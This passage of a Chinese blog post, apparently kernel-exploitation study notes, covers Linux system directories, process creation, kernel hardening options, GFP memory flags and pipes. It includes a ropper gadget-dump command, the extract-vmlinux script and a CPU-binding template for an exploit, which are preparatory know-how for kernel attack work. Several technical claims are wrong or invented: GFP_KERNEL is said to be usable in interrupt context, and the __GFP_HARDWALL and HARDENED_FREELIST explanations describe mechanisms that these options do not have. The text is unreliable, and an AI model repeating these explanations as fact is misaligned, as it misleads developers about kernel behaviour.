<li><strong>安全性</strong>：库文件是攻击者常见的攻击目标之一，因为它们通常具有高权限且被广泛使用。因此，保持系统和库文件的更新是非常重要的。</li>
</ul>
<p>总的来说，<code>/lib</code>目录是类Unix操作系统中非常关键的一个组成部分，它为系统提供了核心的共享库和内核模块，使得系统能够高效地运行各种程序和服务。</p>
<h2 id="proc文件"><a href="#proc文件" class="headerlink" title="proc文件"></a>proc文件</h2><p>在类Unix操作系统中，<code>/proc</code>目录是一个特殊的目录，它并不存储在磁盘上，而是一个虚拟的文件系统，通常被称为proc文件系统。<code>/proc</code>提供了一个窗口，通过它可以查看运行中的内核和进程信息，以及修改某些内核参数。这个目录包含了大量的信息，既包括关于系统硬件的详细信息，也包括关于当前运行的进程的信息。以下是对<code>/proc</code>目录的详细解释：</p>
<h3 id="proc目录的作用"><a href="#proc目录的作用" class="headerlink" title="/proc目录的作用"></a><code>/proc</code>目录的作用</h3><ul>
<li><strong>内核参数访问</strong>：<code>/proc</code>目录允许用户和应用程序访问和修改内核参数。例如，<code>/proc/sys</code>目录下的文件可以用来动态调整内核的行为。</li>
<li><strong>进程信息</strong>：对于系统上的每个进程，<code>/proc</code>都有一个以进程ID命名的子目录，例如<code>/proc/1234</code>。这些目录包含了关于各个进程的详细信息，如内存映射、打开的文件描述符、进程状态等。</li>
<li><strong>系统信息</strong>：<code>/proc</code>目录提供了关于系统硬件和配置的信息，例如CPU信息（<code>/proc/cpuinfo</code>）、内存信息（<code>/proc/meminfo</code>）、分区表（<code>/proc/partitions</code>）等。</li>
</ul>
<h3 id="proc目录的特点"><a href="#proc目录的特点" class="headerlink" title="/proc目录的特点"></a><code>/proc</code>目录的特点</h3><ul>
<li><strong>虚拟的</strong>：<code>/proc</code>是一个虚拟文件系统，它存在于内存中，不占用磁盘空间。这意味着其中的文件和目录是由内核动态生成的，以提供关于系统状态的实时信息。</li>
<li><strong>可读写</strong>：虽然大多数<code>/proc</code>下的文件是只读的，但有些文件是可写的，允许通过直接写入这些文件来修改内核参数。</li>
<li><strong>实时性</strong>：<code>/proc</code>目录下的信息是实时更新的，反映了当前系统的状态。</li>
</ul>
<h3 id="proc目录下的一些重要文件和目录"><a href="#proc目录下的一些重要文件和目录" class="headerlink" title="/proc目录下的一些重要文件和目录"></a><code>/proc</code>目录下的一些重要文件和目录</h3><ul>
<li><strong><code>/proc/cpuinfo</code><strong>：显示</strong>CPU的信息</strong>，如型号、核心数、速度等。</li>
<li><strong><code>/proc/meminfo</code><strong>：显示</strong>内存的详细使用信息</strong>，包括总内存、可用内存、缓存等。</li>
<li><strong><code>/proc/partitions</code><strong>：显示系统中</strong>所有分区</strong>的列表。</li>
<li><strong><code>/proc/sys</code><strong>：包含可以</strong>动态调整的内核参数</strong>。通过修改这里的文件，可以改变系统的行为。</li>
<li><strong><code>/proc/[pid]</code><strong>：每个正在运行的进程都有一个对应的目录，目录名为进程的PID。这些目录</strong>包含了关于进程的详细信息</strong>。</li>
</ul>
<h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>安全性</strong>：由于<code>/proc</code>目录提供了大量的系统信息和部分内核参数修改能力，恶意程序可能会尝试读取这些信息或修改参数以提升权限或进行攻击。因此，系统管理员需要留意对<code>/proc</code>目录的访问控制。</li>
<li><strong>性能影响</strong>：频繁地访问或修改某些<code>/proc</code>文件可能会对系统性能产生影响，特别是在高负载情况下。</li>
</ul>
<p>总的来说，<code>/proc</code>目录是一个功能强大的工具，为系统管理员和开发者提供了一种方便的方式来监控和调整系统运行时的行为。</p>
<h2 id="sbin文件"><a href="#sbin文件" class="headerlink" title="sbin文件"></a>sbin文件</h2><p>在类Unix操作系统中，<code>/sbin</code>目录是一个存放系统管理和维护程序的特殊目录。这个目录包含的程序通常是供系统管理员使用的，而不是普通用户。这些程序包括用于启动、修复、恢复和维护系统的各种工具。与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更多地关注系统级别的操作和维护任务。以下是对<code>/sbin</code>目录的详细解释：</p>
<h3 id="sbin目录的作用"><a href="#sbin目录的作用" class="headerlink" title="/sbin目录的作用"></a><code>/sbin</code>目录的作用</h3><ul>
<li><strong>系统启动和恢复</strong>：<code>/sbin</code>目录包含了启动系统所需的重要命令，如<code>init</code>、<code>systemd</code>或<code>upstart</code>。这些是系统初始化和管理服务的核心工具。</li>
<li><strong>设备管理</strong>：这个目录下的命令包括用于管理硬件设备的程序，比如<code>fdisk</code>、<code>mkfs</code>、<code>fsck</code>等，它们分别用于分区、格式化和检查文件系统。</li>
<li><strong>网络配置</strong>：<code>/sbin</code>还包含了配置网络的工具，例如<code>ifconfig</code>（尽管在一些现代的Linux发行版中，<code>ifconfig</code>已经被<code>ip</code>命令替代，并且可能位于<code>/bin</code>或<code>/usr/bin</code>目录）。</li>
<li><strong>系统安全</strong>：包括用于设置和管理系统安全方面的命令，如<code>iptables</code>用于配置防火墙规则。</li>
</ul>
<h3 id="sbin目录的特点"><a href="#sbin目录的特点" class="headerlink" title="/sbin目录的特点"></a><code>/sbin</code>目录的特点</h3><ul>
<li><strong>专业性</strong>：与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更加专业，主要面向系统管理和维护。</li>
<li><strong>访问限制</strong>：出于安全考虑，这些命令通常只有root用户或具有相应权限的用户才能执行。这是为了防止普通用户执行可能会影响系统稳定性和安全性的操作。</li>
</ul>
<h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>谨慎使用</strong>：由于<code>/sbin</code>目录下的命令具有很高的权限和强大的功能，不当的使用可能会导致系统不稳定甚至数据丢失。因此，只有在清楚命令作用的情况下才使用这些命令。</li>
<li><strong>路径问题</strong>：在一些系统中，特别是在非root用户下，<code>/sbin</code>目录可能不在默认的环境变量<code>PATH</code>中。如果需要执行<code>/sbin</code>目录下的命令，可能需要指定完整的路径或临时修改<code>PATH</code>变量。</li>
</ul>
<p>总的来说，<code>/sbin</code>目录是类Unix操作系统中非常重要的一个目录，它包含了许多系统级别的管理和维护工具。了解和合理使用这些工具对于系统管理员来说非常重要。</p>
<h2 id="sys文件"><a href="#sys文件" class="headerlink" title="sys文件"></a>sys文件</h2><p>在类Unix操作系统中，<code>/sys</code>目录是一个虚拟文件系统，称为sysfs。sysfs提供了一种机制，使得内核空间能够将信息导出到用户空间，从而允许用户空间的程序和用户查询和控制内核中的设备和驱动程序的状态。与<code>/proc</code>文件系统相似，<code>/sys</code>也不占用磁盘空间，它在系统启动时由内核动态生成。以下是对<code>/sys</code>目录的详细解释：</p>
<h3 id="sys目录的作用"><a href="#sys目录的作用" class="headerlink" title="/sys目录的作用"></a><code>/sys</code>目录的作用</h3><ul>
<li><strong>设备和驱动程序信息</strong>：<code>/sys</code>提供了一种查看和交互式修改与系统硬件设备相关的信息的方法。每个硬件设备在<code>/sys</code>中都有一个对应的目录，通过这个目录，可以访问设备的属性、状态以及相关的驱动程序信息。</li>
<li><strong>内核对象（kobjects）表示</strong>：sysfs使用内核对象（kobjects）来表示内核中的各种结构，如设备、驱动程序和内核模块。这为用户提供了一种直观的方式来浏览和修改这些对象的属性。</li>
<li><strong>系统配置</strong>：除了提供设备信息，<code>/sys</code>还允许某些参数的动态修改，这可以影响系统的运行方式和设备的配置。</li>
</ul>
<h3 id="sys目录的特点"><a href="#sys目录的特点" class="headerlink" title="/sys目录的特点"></a><code>/sys</code>目录的特点</h3><ul>
<li><strong>虚拟的</strong>：与<code>/proc</code>一样，<code>/sys</code>是一个虚拟文件系统，它反映了内核的当前状态，但不占用实际的磁盘空间。</li>
<li><strong>结构化</strong>：<code>/sys</code>的结构比<code>/proc</code>更加直观和有组织，它按照设备类型和功能进行组织，使得查找特定设备或信息更加容易。</li>
<li><strong>可读写</strong>：<code>/sys</code>中的许多文件不仅可读，也可写。这允许用户或应用程序通过写入这些文件来改变设备的状态或配置。</li>
</ul>
<h3 id="sys目录下的一些重要子目录"><a href="#sys目录下的一些重要子目录" class="headerlink" title="/sys目录下的一些重要子目录"></a><code>/sys</code>目录下的一些重要子目录</h3><ul>
<li>**<code>/sys/block</code>**：包含系统中所有块设备的信息，如硬盘和光驱。</li>
<li>**<code>/sys/class</code>**：按设备类型组织的设备信息，如<code>/sys/class/net</code>包含网络接口的信息。</li>
<li>**<code>/sys/devices</code>**：包含系统中所有设备的层次结构，这是按照物理或逻辑结构组织的。</li>
<li>**<code>/sys/module</code>**：包含当前加载的内核模块信息。</li>
</ul>
<h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>谨慎修改</strong>：虽然<code>/sys</code>提供了修改设备配置和参数的能力，但不恰当的修改可能会导致系统不稳定或硬件设备工作异常。因此，在修改<code>/sys</code>中的文件之前，应确保了解这些修改的含义和后果。</li>
<li><strong>权限</strong>：修改<code>/sys</code>中的文件通常需要管理员权限，因为这些更改可能会影响系统的整体运行。</li>
</ul>
<p>总的来说，<code>/sys</code>目录是Linux内核提供的一种强大的机制，用于展示系统硬件信息和配置，它为用户和程序提供了直接与内核交互的能力。</p>
<h2 id="tmp文件"><a href="#tmp文件" class="headerlink" title="tmp文件"></a>tmp文件</h2><p>在类Unix操作系统中，<code>/tmp</code>目录是一个用于存放临时文件的特殊目录。这个目录供系统和用户存放在短期内需要的文件，但这些文件随后可能会被删除或丢弃。<code>/tmp</code>目录对所有用户都是可写的，因此它是多用户环境下共享临时数据的一个常用位置。以下是对<code>/tmp</code>目录的详细解释：</p>
<h3 id="tmp目录的作用"><a href="#tmp目录的作用" class="headerlink" title="/tmp目录的作用"></a><code>/tmp</code>目录的作用</h3><ul>
<li><strong>临时数据存储</strong>：<code>/tmp</code>提供了一个存储临时数据的地方，这些数据包括但不限于临时文件、处理中的数据文件、缓存文件等。</li>
<li><strong>程序执行中间产物</strong>：很多程序在执行过程中会产生临时文件，这些文件用于存储中间结果或日志信息，执行完毕后通常会被删除。</li>
<li><strong>用户和应用程序的临时文件</strong>：除了系统进程外，用户启动的应用程序也可能会在<code>/tmp</code>中创建临时文件，用于各种临时需求。</li>
</ul>
<h3 id="tmp目录的特点"><a href="#tmp目录的特点" class="headerlink" title="/tmp目录的特点"></a><code>/tmp</code>目录的特点</h3><ul>
<li><strong>易失性</strong>：<code>/tmp</code>目录中的数据是易失的，这意味着在系统重启过程中，存储在其中的文件可能会被删除。一些系统在启动时会自动清理<code>/tmp</code>目录，而其他系统可能会运行定期的清理任务。</li>
<li><strong>安全性</strong>：由于<code>/tmp</code>是对所有用户可写的，因此存在一定的安全风险。恶意用户或程序可能会尝试利用<code>/tmp</code>目录中的文件执行攻击，或通过创建大量文件耗尽系统资源。</li>
<li><strong>权限管理</strong>：系统通常会对<code>/tmp</code>目录设置特定的权限和粘滞位（sticky bit），以防止用户删除或修改不属于他们的文件。</li>
</ul>
<h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>定期清理</strong>：由于<code>/tmp</code>用于存放临时文件，建议定期清理以释放磁盘空间，尤其是在磁盘空间较小的系统上。</li>
<li><strong>安全措施</strong>：在使用<code>/tmp</code>时，应该注意安全性，避免在其中存储敏感信息。同时，开发者在创建临时文件时应使用安全的方法，如使用<code>mktemp</code>命令或相应的库函数来创建唯一的临时文件名，以减少安全风险。</li>
<li><strong>替代方案</strong>：对于需要长期存储的临时文件，应考虑使用其他目录，如用户的主目录下的临时文件夹，或者系统提供的其他临时存储位置，例如<code>/var/tmp</code>。与<code>/tmp</code>不同，<code>/var/tmp</code>在系统重启后通常不会被清空。</li>
</ul>
<p>总的来说，<code>/tmp</code>目录是一个用于存放临时文件的便利位置，但使用时需要注意数据的易失性和安全性问题。合理管理<code>/tmp</code>目录对于维护系统的稳定性和安全性非常重要。</p>
<h1 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h1><p>一个进程的创建可以发生在以下几种情况下：</p>
<ol>
<li>系统启动： 当计算机系统启动时，会自动创建一个或多个进程作为系统的初始进程。这些初始进程通常是操作系统内核的一部分，负责初始化系统资源、加载驱动程序和启动其他进程。</li>
<li>程序执行： 当执行一个可执行程序时，操作系统会创建一个新的进程来运行该程序。这个新创建的进程称为子进程，而执行程序的进程称为父进程。子进程是父进程的副本，它会继承父进程的代码、数据和资源，并开始执行程序的指令。</li>
<li>调用fork()函数： 通过调用系统调用函数<code>fork()</code>，一个进程可以创建一个与自身相同的副本，即父进程和子进程。调用<code>fork()</code>函数后，当前进程会复制自身，创建一个全新的进程作为子进程，而原始进程则继续执行。父进程和子进程在调用<code>fork()</code>之后同时执行，但是它们可以根据<code>fork()</code>的返回值来区分自己的角色。</li>
<li>调用exec()函数： 通过调用系统调用函数<code>exec()</code>，一个进程可以加载并执行一个新的可执行程序。<code>exec()</code>函数会替换当前进程的代码和数据，并开始执行新程序的指令。使用<code>exec()</code>函数创建的进程不是通过复制父进程而创建的，而是直接加载新的程序。</li>
</ol>
<p>需要注意的是，进程的创建并不是立即发生的，而是在操作系统调度时才会真正创建和执行。操作系统根据调度策略和优先级来决定进程的创建和运行顺序。</p>
<h1 id="补充汇编知识"><a href="#补充汇编知识" class="headerlink" title="补充汇编知识"></a>补充汇编知识</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg rax rsp：交换rax和rsp的值</span><br><span class="line">dec ebx：ebx自减<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="补充某些保护"><a href="#补充某些保护" class="headerlink" title="补充某些保护"></a>补充某些保护</h1><ul>
<li><code>CONFIG_MEMCG_KMEM</code>：使得<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 会从不一样的 <code>kmalloc-xx</code> 中进行分配</li>
<li><code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>：这使得固定函数调用到内核栈底的偏移值是变化的</li>
<li><code>SLAB_FREELIST_HARDENED</code>：这使得 freelist 有保护，不能随意控制</li>
<li><code>HARDENED_FREELIST</code>：该机制通过以下方式提高自由链表的安全性：<ol>
<li>随机化指针：<code>HARDENED_FREELIST</code>会对自由链表中的指针进行随机化处理，使攻击者难以预测或修改指针的值。这样可以防止攻击者利用已知的指针偏移或地址来修改自由链表的指针。</li>
<li>校验和保护：<code>HARDENED_FREELIST</code>会使用校验和来验证自由链表中的指针是否被篡改。通过计算和验证校验和，可以检测指针是否被修改，从而防止攻击者对自由链表进行恶意修改。</li>
<li>隔离和分割：<code>HARDENED_FREELIST</code>会将自由链表与其他内存区域进行隔离和分割，以减少攻击者对自由链表的访问和修改机会。这种隔离和分割可以通过物理或虚拟内存布局来实现。</li>
</ol>
</li>
<li><code>RANDOMIZE_FREELIST</code>：可以提供以下安全性优势：<ol>
<li>防止指针猜测：攻击者通常会尝试猜测或推断自由链表中的指针值，以便修改它们以控制内存分配。通过随机化指针，攻击者无法准确猜测指针的值，从而增加攻击的困难度。</li>
<li>减少重复利用：某些堆漏洞（如双重释放）可能导致攻击者重复利用自由链表中的已释放内存块。通过随机化自由链表指针，可以降低攻击者成功利用重复利用漏洞的概率。</li>
</ol>
</li>
</ul>
<h1 id="补充某些内核的知识"><a href="#补充某些内核的知识" class="headerlink" title="补充某些内核的知识"></a>补充某些内核的知识</h1><h2 id="GFP-KERNEL"><a href="#GFP-KERNEL" class="headerlink" title="GFP_KERNEL"></a>GFP_KERNEL</h2><p><code>GFP_KERNEL</code> 是 Linux 内核中用于内存分配的标志之一，它表示在内核中申请内存时使用的标志。</p>
<p>GFP 代表 “Get Free Page”，它是内核中用于分配页面（Page）的函数 <code>__alloc_pages()</code> 和 <code>kmalloc()</code> 的标志参数之一。<code>GFP_KERNEL</code> 是其中最常用的标志之一，它表示常规的内核内存分配。</p>
<p>使用 <code>GFP_KERNEL</code> 标志进行内存分配意味着：</p>
<ol>
<li>内存分配是针对内核使用的，而不是用户空间。</li>
<li>内存分配是在常规内核上下文中进行的，例如进程上下文或中断上下文。</li>
<li>内存分配是可睡眠的，即如果没有足够的可用内存，调用者可能会被置于睡眠状态，直到有足够的内存可用。</li>
</ol>
<p><code>GFP_KERNEL</code> 标志通常用于在内核中进行常规的内存分配，例如数据结构的动态分配、缓存的分配等。它提供了一种默认的内存分配策略，适用于大多数内核代码的需求。</p>
<h2 id="GFP-HARDWALL"><a href="#GFP-HARDWALL" class="headerlink" title="__GFP_HARDWALL"></a>__GFP_HARDWALL</h2><p><code>__GFP_HARDWALL</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p>
<p><code>__GFP_HARDWALL</code> 标志的作用是在内存分配过程中强制执行硬壁（hardwall）策略。硬壁策略是一种内存分配的安全机制，用于防止内存资源的过度消耗。</p>
<p>当使用 <code>__GFP_HARDWALL</code> 标志进行内存分配时，内核会采取以下行为：</p>
<ol>
<li>限制内存分配的数量：内核会限制每个进程或上下文中的内存分配数量，以防止资源过度消耗。</li>
<li>强制等待：如果没有足够的可用内存，内核会强制等待，直到有足够的内存可用，而不是尝试其他的内存回收或压缩策略。</li>
</ol>
<p>通过使用 <code>__GFP_HARDWALL</code> 标志，内核可以确保内存分配不会无限制地消耗系统资源，从而提高系统的可靠性和稳定性。这对于关键任务和资源受限环境下的系统特别重要。</p>
<h2 id="GFP-NOWARN"><a href="#GFP-NOWARN" class="headerlink" title="__GFP_NOWARN"></a>__GFP_NOWARN</h2><p><code>__GFP_NOWARN</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p>
<p><code>__GFP_NOWARN</code> 标志的作用是禁止内核在内存分配失败时发出警告或打印错误消息。通常，当内存分配失败时，内核会发出警告或打印错误消息，以提醒开发人员或系统管理员可能存在的问题。</p>
<p>使用 <code>__GFP_NOWARN</code> 标志进行内存分配时，内核会执行以下行为：</p>
<ol>
<li>禁止警告信息：内核不会发出警告或打印错误消息，即使内存分配失败。</li>
<li>返回 NULL 或错误码：内核可能会返回 NULL 指针或特定的错误码，以表示内存分配失败，而不是发出警告消息。</li>
</ol>
<h1 id="一些指令"><a href="#一些指令" class="headerlink" title="一些指令"></a>一些指令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">sudo ./tiqu.sh bzImage &gt; vmlinux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 exp 进程绑定至指定核心的模板：</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span>   <span class="comment">//xp中直接调用该函数，core=0 ........</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="提取vmlinux的脚本"><a href="#提取vmlinux的脚本" class="headerlink" title="提取vmlinux的脚本"></a>提取vmlinux的脚本</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		<span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>

<h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/oguro/article/details/53841949">linux管道pipe详解_linux pipe-CSDN博客</a></p>
<h3 id="管道的概念："><a href="#管道的概念：" class="headerlink" title="管道的概念："></a>管道的概念：</h3><p>管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质：</p>
<ol>
<li>其本质是一个伪文件(实为内核缓冲区)</li>
<li>由两个文件描述符引用，一个表示读端，一个表示写端。</li>
<li>规定数据从管道的写端流入管道，从读端流出。</li>
</ol>
<p>管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区(4k)实现。</p>
<p>管道的局限性：</p>
<p>① 数据自己读不能自己写。</p>
<p>② 数据一旦被读走，便不在管道中存在，不可反复读取。</p>
<p>③ 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。</p>
<p>④ 只能在有公共祖先的进程间使用管道。</p>
<p>常见的通信方式有，单工通信、半双工通信、全双工通信。</p>
<h3 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h3><p>创建管道</p>
<p>  <code>int pipe(int pipefd[2]); 成功：0；失败：-1，设置errno</code></p>
<p>函数调用成功返回r&#x2F;w两个文件描述符。无需open，但需手动close。规定：fd[0] → r； fd[1] → w，就像0对应标准输入，1对应标准输出一样。向管道文件读写数据其实是在读写内核缓冲区。</p>
<p>管道创建成功以后，创建该管道的进程（父进程）同时掌握着管道的读端和写端。如何实现父子进程间通信呢？通常可以采用如下步骤：</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213695.png" alt="img"> </p>
<ol>
<li>父进程调用pipe函数创建管道，得到两个文件描述符fd[0]、fd[1]指向管道的读端和写端。</li>
<li>父进程调用fork创建子进程，那么子进程也有两个文件描述符指向同一管道。</li>
<li>父进程关闭管道读端，子进程关闭管道写端。父进程可以向管道中写入数据，子进程将管道中的数据读出。由于管道是利用环形队列实现的，数据从写端流入管道，从读端流出，这样就实现了进程间通信。</li>
</ol>
<h1 id="seq-operation结构体"><a href="#seq-operation结构体" class="headerlink" title="seq_operation结构体"></a>seq_operation结构体</h1><p>本文档的Copyleft归yfydz所有，使用GPL发布，可以自由拷贝，转载，转载时请保持文档的完整性，严禁用于任何商业用途。<br>msn: <a href="mailto:yfydz_no1@hotmail.com">yfydz_no1@hotmail.com</a><br>来源：<a target="_blank" rel="noopener" href="http://yfydz.cublog.cn/">http://yfydz.cublog.cn</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在fs&#x2F;seq_file.c中定义了关于seq操作的一系列顺序读取的函数，这些函数最早是在2001年就引入了，但以前内核中一直用得不多，而到了2.6内核后，许多&#x2F;proc的只读文件中大量使用了seq函数处理。</p>
<p>以下内核源码版本为2.6.17.11。</p>
